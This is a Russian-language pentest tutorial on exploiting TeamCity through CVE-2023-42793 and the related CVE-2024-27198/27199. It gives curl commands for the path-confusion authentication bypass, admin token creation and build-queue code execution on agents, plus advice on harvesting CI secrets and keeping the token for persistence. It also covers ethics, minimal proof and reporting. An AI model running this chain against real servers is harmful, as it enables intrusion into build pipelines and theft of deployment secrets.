## Вопрос, с которого всё начинается

Внутри сети стоит TeamCity — сервер сборки от JetBrains. Он собирает проекты и, по определению, имеет доступ к коду, креды и права запускать скрипты на агентах. В 2023 году нашли CVE-2023-42793: обход аутентификации, через который можно создать токен администратора и выполнить код. Разберём цепочку.

## Что такое TeamCity и почему он важен

**TeamCity** — популярный CI-сервер. Он состоит из **сервера** (управление, UI, REST API) и **агентов** (машины, которые выполняют сборки). Сервер хранит конфигурации, креды и **токены**. Агенты выполняют произвольные скрипты — это их работа.

Ключевой факт: получив права в TeamCity, ты получаешь возможность запускать команды на агентах, а у агентов часто есть доступ к продакшену (деплой-ключи, docker registry). Поэтому CI-сервер — высокоценная цель.

## Наш пример: TeamCity 2023.05.3

Цель — `http://teamcity.target.example:8111`. Определяем версию:

```
$ curl -s http://teamcity.target.example:8111/app/rest/server | grep -o 'version="[^"]*"'
version="2023.05.3"
```

Версия **2023.05.3** — попадает в диапазон CVE-2023-42793 (все версии до 2023.05.4). Отлично.

## Шаг 1: понять обход аутентификации

CVE-2023-42793 — это **path confusion** в маршрутизации REST API. Специальная конструкция в пути (`;.jsp` или `?jsp=`) заставляет обработчик пропустить проверку авторизации. То есть эндпоинт, требующий админских прав, выполняется без них.

Это уже знакомая нам схема: два компонента по-разному понимают путь, и проверка «прилипает» не к тому. Поэтому сначала проверяем служебный эндпоинт без логина.

## Шаг 2: подтвердить обход

Проверяем неразрушающе — запрашиваем список пользователей, который требует прав:

```
$ curl -s -o /dev/null -w '%{http_code}\n' \
  'http://teamcity.target.example:8111/app/rest/users/id:1'
401
$ curl -s -o /dev/null -w '%{http_code}\n' \
  'http://teamcity.target.example:8111/app/rest/users/id:1;.jsp'
200
```

`401` без обхода и `200` с обходом — аутентификацию обошли.

## Шаг 3: создать токен администратора

Дальше через обойдённый эндпоинт создаём API-токен для пользователя `id:1` (обычно администратор):

```
$ curl -s -X POST \
  'http://teamcity.target.example:8111/app/rest/users/id:1/tokens/mytoken;.jsp' \
  -d 'name=mytoken'
{"name":"mytoken","value":"eyJ0eXAiOiAiSldUIi..."}
```

Теперь у нас есть **токен админа** — полный доступ к TeamCity.

## Шаг 4: RCE через агент сборки

С админским токеном создаём или меняем сборку так, чтобы она выполнила нашу команду на агенте. Простейший путь — создать проект с build-step типа «Command Line» и запустить его:

```
$ curl -s -X POST -H 'Authorization: Bearer eyJ0eXAi...' \
  'http://teamcity.target.example:8111/app/rest/buildQueue' \
  -H 'Content-Type: application/xml' \
  --data-binary @build.xml
```

Агент выполнит команду. Так CI-сервер превращается в RCE-платформу.

## Шаг 5: CVE-2024-27198 / 27199

В 2024 году нашли ещё две похожие уязвимости обхода аутентификации (CVE-2024-27198, CVE-2024-27199), затрагивающие почти все версии. Механизм — снова path confusion. Они позволяют то же самое: получить админский доступ. Если 42793 пропатчен — проверь 27198.

## Шаг 6: пост-эксплуатация

Из TeamCity достают: CI-переменные с паролями (часто в открытом виде), токены к VCS и registry, SSH-ключи деплоя, конфигурации сборок. Агенты могут иметь доступ к облаку и продакшену. То есть CI-сервер — центральный узел, через который идёт деплой.

## Что мы теперь знаем

- TeamCity — CI-сервер с сервером и агентами, исполняющими скрипты.
- CVE-2023-42793 — обход аутентификации через path confusion.
- Через обход создают токен админа, затем выполняют код на агенте.
- CVE-2024-27198/27199 — похожие обходы.
- Из TeamCity достают CI-секреты и ключи деплоя.

## Разбираем, почему path confusion так часто встречается

TeamCity, как и многие Java-сервисы, стоит за реверс-прокси (nginx, Apache). Прокси и приложение по-разному разбирают путь — и это корень бага. Конструкции `;.jsp`, `;` (matrix parameter), двойное кодирование, лишние слэши заставляют проверку авторизации «прилипнуть» к одному пути, а обработчик — выполнить другой.

Правило при пентесте Java-сервисов: **всегда пробуй альтернативные представления пути**. Даже если обычный запрос вернул `401`, добавь `;.jsp`, `%2e`, `..;/`, двойной слэш — и проверь снова. Этот приём универсален: он срабатывал в TeamCity, Ivanti, Spring, Tomcat и десятках других продуктов.

## Шаг 7: закрепление через токен

API-токен, который ты создал через обход, — это не только одноразовый доступ. Он живёт, пока его не отзовут, и работает как полноценная учётка. Для доказательства достаточно одного запроса; для устойчивости (по согласованию) токен сохраняют. Но помни этику: созданный токен — это изменение состояния, его нужно фиксировать и, если возможно, удалять после проверки.

```
$ curl -s -H 'Authorization: Bearer <token>' \
  'http://teamcity.target.example:8111/app/rest/users/current'
{"username":"admin","id":1,"email":"admin@corp.local"}
```

## Шаг 8: чем отличается от Jenkins

Jenkins и TeamCity — оба CI, но векторы разные. Jenkins: Groovy Script Console (`/script`), file-read через CVE-2024-23897. TeamCity: обход аутентификации через REST. Если видишь `/script` и заголовок `X-Jenkins` — это Jenkins; если `/app/rest/server` и порт 8111 — TeamCity. Различай до атаки.

## Шаг 9: что писать в отчёте

Отчёт по TeamCity фиксирует: версию и источник; CVE (42793 и/или 27198); тип (pre-auth); доказательство обхода (разные коды) и созданного токена; импакт (RCE на агентах = доступ к кредо деплоя); рекомендацию (патч до 2023.05.4+, ротация всех CI-секретов — токены и переменные могли быть украдены).

## Ошибки и антипаттерны

Первая — запускать реальную сборку на проде: это может задеплоить что-то или сломать пайплайн. Вторая — забыть, что обход касается не только создания токена: через него доступны все админские эндпоинты. Третья — не проверить 27198, когда 42793 пропатчен: баги почти идентичны, но CVE разные, и защита могла закрыть только один.

## Практика: как найти уязвимую версию без API

Если `/app/rest/server` закрыт, версию снимают по статике. В TeamCity есть файл `/js/version.js` и метаданные сборки в HTML. Также помогает `nuclei -tags teamcity` — шаблоны проверяют CVE неразрушающе. Комбинация «статический признак + шаблон» даёт версию и подтверждение бага без изменения состояния сервера.

## Практика: чем ограничиться для доказательства

Полная цепочка (создание токена + запуск сборки) меняет состояние CI-сервера. Для отчёта достаточно: (1) показать разницу кодов `401`/`200` — обход подтверждён; (2) создать токен и выполнить один читающий запрос (`/app/rest/users/current`). Этого хватает, чтобы доказать админский доступ, не запуская сборок и не трогая пайплайны. Полную эксплуатацию — только по согласованию.

## Практика: как выглядит отчёт по CI-серверу

CI-сервер — это не «веб-приложение», а узел с высокими правами, поэтому отчёт делают особым образом. В нём указывают: версию TeamCity и источник; CVE (42793 / 27198) с диапазоном; тип (pre-auth); доказательство обхода (разные коды `401`/`200` на одном эндпоинте); доказательство админского доступа (созданный токен и читающий запрос); импакт — RCE на агентах, доступ к CI-переменным, возможность деплоя; рекомендацию — патч, ротация всех секретов и токенов, аудит сборок на изменения.

Ключевое в отчёте — подчеркнуть, что через CI-сервер атакующий может дотянуться до прода. Это меняет приоритет находки с «medium» на «critical».
